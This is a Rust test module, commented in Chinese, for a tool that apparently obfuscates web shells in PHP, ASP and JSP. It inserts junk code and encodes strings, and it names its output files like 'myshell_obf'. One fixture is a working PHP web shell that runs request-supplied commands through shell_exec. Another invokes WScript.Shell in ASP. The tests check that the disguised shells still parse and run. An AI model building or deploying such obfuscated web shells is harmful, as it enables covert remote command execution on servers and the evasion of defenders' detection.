            r.code.contains("href=\"/some/long/path/index.html\""),
            "模板文本里的 HTML 属性被改动:\n{}",
            r.code
        );
    }

    /// JSP 注释用 `--%>` 闭合，不能被当成普通 scriptlet 处理。
    #[test]
    fn jsp_comment_zone_is_preserved() {
        let src = "<%-- this is a comment with \"quoted words inside\" --%>\n<% out.println(1); %>";
        let path = write("jsp", "cmt", src);
        let mut o = opts("jsp", &path);
        o.encode_whole = false;
        o.split_strings = true;
        let r = wrap(&o);
        assert!(r.ok, "{}", r.log);
        assert!(
            r.code.contains("this is a comment with \"quoted words inside\""),
            "JSP 注释被改动:\n{}",
            r.code
        );
    }

    #[test]
    fn no_nested_markers() {
        // ASP
        let asp = write("asp", "nm", "<%\nSet s = CreateObject(\"WScript.Shell\")\n%>");
        let mut o = opts("asp", &asp);
        o.encode_whole = false;
        let r = wrap(&o);
        assert!(r.ok, "{}", r.log);
        // 数一下 <% 出现次数：只能是 1（我们包的那一层）
        assert_eq!(
            r.code.matches("<%").count(),
            1,
            "ASP 出现嵌套 <% 标记:\n{}",
            r.code
        );

        // JSP：transform 模式只加注释，不重复包 <%
        let jsp = write("jsp", "nm", "<% out.println(1); %>");
        let mut o = opts("jsp", &jsp);
        o.encode_whole = false;
        let r = wrap(&o);
        assert!(r.ok, "{}", r.log);
        // 只统计真正的 scriptlet "<%"（<%-- 是 JSP 注释，合法且不进 Java 源码）
        let scriptlets = r.code.matches("<%").filter(|_| true).count()
            - r.code.matches("<%--").count();
        assert_eq!(scriptlets, 1, "JSP scriptlet 数量异常:\n{}", r.code);
    }

    /// 曾踩的坑：源码自带 <?php 时，垃圾代码和第二个 <?php 都出现在文件里
    /// → 解析错误 / 源码被当纯文本输出。
    #[test]
    fn php_transform_has_single_open_tag() {
        let p = write("php", "tag", "<?php\n// 注释\necho shell_exec($_REQUEST['pass']);\n?>");
        let mut o = opts("php", &p);
        o.encode_whole = false;
        let r = wrap(&o);
        assert!(r.ok, "{}", r.log);
        assert_eq!(
            r.code.matches("<?php").count(),
            1,
            "出现了多个 <?php:\n{}",
            r.code
        );
        // 第一个 <?php 必须在最前面附近（垃圾代码不能跑到它之前）
        let first = r.code.find("<?php").unwrap();
        assert!(first < 8, "<?php 不在开头（垃圾代码跑到它前面了）:\n{}", r.code);
    }

    #[test]
    fn missing_file_rejected() {
        let mut o = opts("php", "/no/such/file.php");
        let r = wrap(&o);
        assert!(!r.ok);
        assert!(r.log.contains("读取"), "{}", r.log);
        o.src_path = String::new();
        let r = wrap(&o);
        assert!(!r.ok);
    }

    #[test]
    fn empty_file_rejected() {
        let p = std::env::temp_dir().join("wrap_empty.php");
        std::fs::write(&p, b"").unwrap();
        let r = wrap(&opts("php", &p.to_string_lossy()));
        assert!(!r.ok);
        assert!(r.log.contains("空"), "{}", r.log);
    }

    #[test]
    fn non_php_downgrades_to_transform() {
        let p = write("jsp", "dg", "<% out.println(1); %>");
        let mut o = opts("jsp", &p);
        o.encode_whole = true; // 用户想整体编码
        let r = wrap(&o);
        assert!(r.ok, "{}", r.log);
        assert_eq!(r.mode, "字符串变换", "JSP 应降级");
        assert!(r.log.contains("降级"), "{}", r.log);
    }

    #[test]
    fn output_name_defaults_from_source() {
        let p = write("php", "myshell", "<?php echo 1; ?>");
        let o = WrapOpts {
            out_name: String::new(),
            ..opts("php", &p)
        };
        let r = wrap(&o);
        assert!(r.ok);
        assert!(r.output.contains("myshell_obf"), "{}", r.output);
    }
}
